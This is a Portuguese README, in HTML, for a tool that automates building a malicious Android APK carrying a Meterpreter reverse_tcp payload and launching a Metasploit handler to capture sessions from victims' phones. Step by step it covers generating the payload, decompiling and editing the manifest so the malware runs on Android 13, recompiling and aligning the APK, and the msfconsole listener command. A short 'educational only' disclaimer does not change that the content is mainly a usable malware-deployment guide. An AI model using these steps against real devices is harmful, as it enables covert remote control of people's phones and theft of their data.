<h1>Automatização de Geração de APK com Payload Meterpreter e Exploração com Metasploit</h1>
<p>Este projeto automatiza o processo de criação de um APK malicioso com o payload Meterpreter para Android, utilizando o <code>msfvenom</code>, e fornece instruções para modificar o <code>AndroidManifest.xml</code> para compatibilidade com Android 13. O script também inicia automaticamente o listener no Metasploit para capturar a conexão do dispositivo alvo.
    (    OU SEJA ELE PEGA SEU IP COM IPCONFIG BOTA NO LHOST GERAR O PAYLOAD E DEPOIS EXECUTAR O METERPRETE AUTOMATICO )
</p>

<h2>Requisitos</h2>
<ul>
<li>Python 3 instalado.</li>
<li><code>msfvenom</code>: Ferramenta do Metasploit para gerar payloads.</li>
<li>Metasploit Framework: Ferramenta para exploração e captura de sessões de meterpreter.</li>
<li><code>ApkTool</code>: Ferramenta para descompilar, modificar e recompilar APKs.</li>
<li><code>ZipAlign</code>: Ferramenta para otimizar APKs.</li>
<li><code>ApkSigner</code>: Ferramenta para assinar APKs.</li>
</ul>

<h2>Instalação dos requisitos</h2>
<p>Instale o Metasploit Framework:</p>
<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | sudo bash</code></pre>

<p>Instale o ApkTool:</p>
<ul>
<li>Baixe o ApkTool para atualizar para o Android 13 <a href="https://github.com/iBotPeaches/Apktool" target="_blank">aqui</a>.</li>
<li>Siga as instruções para a instalação no seu sistema.</li>
</ul>

<p>Instale o ZipAlign:</p>
<ul>
<li>O ZipAlign geralmente faz parte do Android SDK.</li>
<li>Você pode baixar o Android SDK <a href="https://developer.android.com/studio" target="_blank">aqui</a>.</li>
</ul>

<p><code>msfvenom</code> já faz parte do Metasploit Framework, então você não precisa instalar separadamente.</p>

<h2>Como usar o script</h2>
<h3>Passo 1: Clone o repositório</h3>
<p>Clone este repositório para sua máquina local:</p>
<pre><code>git clone https://github.com/seu-usuario/automacao-apk-metasploit.git
cd automacao-apk-metasploit</code></pre>

<h3>Passo 2: Execute o script</h3>
<p>Antes de executar o script, certifique-se de que todas as ferramentas mencionadas acima estão instaladas e funcionando corretamente.</p>
<p>Execute o script Python:</p>
<pre><code>python3 generate_apk.py</code></pre>

<h3>Passo 3: O que o script faz</h3>
<ul>
<li><strong>Obtém o IP local</strong>: O script utiliza o comando <code>ifconfig</code> para obter o IP local da máquina.</li>
<li><strong>Gera o APK</strong>: Usando o <code>msfvenom</code>, o script gera um APK malicioso com o payload Meterpreter para o IP local (LHOST) e porta <code>4444</code> (LPORT).</li>
<li><strong>Instruções para Modificar o Manifesto</strong>: O script fornecerá as instruções para você atualizar o arquivo <code>AndroidManifest.xml</code> no APK para torná-lo compatível com Android 13.</li>
<li><strong>Iniciar o Listener no Metasploit</strong>: O script executará automaticamente o Metasploit para começar a escutar conexões de dispositivos com o payload.</li>
</ul>

<h3>Passo 4: Atualizar o AndroidManifest.xml (para Android 13)</h3>
<p>Após gerar o APK, você precisa modificar o <code>AndroidManifest.xml</code> para Android 13. Para isso, execute:</p>
    <pre><code>apktool d Brunao.apk</code></pre>

<p>Abra o arquivo <code>AndroidManifest.xml</code> dentro da pasta descompilada e adicione as permissões necessárias para Android 13.</p>

<p>Recompile o APK:</p>
<pre><code>apktool b Brunao</code></pre>
<p>Vá em  AndroidManifest.xml cole o codigo, jogue no chat gpt e mande atualiza para o Android 13 ou mais recente</p>

<p>Alinhe o APK com o comando:</p>
<pre><code>zipalign -v 4 Brunao.apk Brunao.apk</code></pre>

<p>Depois, o APK estará pronto para ser assinado e instalado.</p>

<h3>Passo 5: Executando o Listener no Metasploit</h3>
<p>Para iniciar o listener no Metasploit e aguardar a conexão do dispositivo alvo, execute:</p>
<pre><code>msfconsole -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST [SEU_IP]; set LPORT 4444; exploit'</code></pre>

<p>Este comando configurará o Metasploit para escutar as conexões de dispositivos com o payload.</p>

<h2>Contribuindo</h2>
<p>Sinta-se à vontade para fazer melhorias no código e enviar pull requests.</p>

<h2>Aviso Legal</h2>
<p>Este projeto é somente para fins educacionais. Não use essas técnicas em sistemas sem permissão. Realizar ataques sem autorização é ilegal e pode levar a sérias consequências legais.</p>

<div class="footer">
<p>&copy; 2025 Seu Nome. Todos os direitos reservados.</p>
</div>


Exemplo de Execução
Obter o IP da máquina: O script encontra o IP privado e o exibe.

Gerar o APK: O script gera o APK malicioso com o msfvenom.

Atualizar o AndroidManifest.xml: O script fornece as instruções para editar o AndroidManifest.xml para Android 13.

Iniciar o Listener: O script inicia o listener do Metasploit e exibe:

Copiar código
Iniciando o Metasploit... Aguarde.
Sessão meterpreter iniciada.
Exibir Comandos: O script exibe os comandos disponíveis, como "executar" e "help".

<h1>Leia a msg que tá no terminal acima da execução do payload sobre a atualização para o android 13</h1>
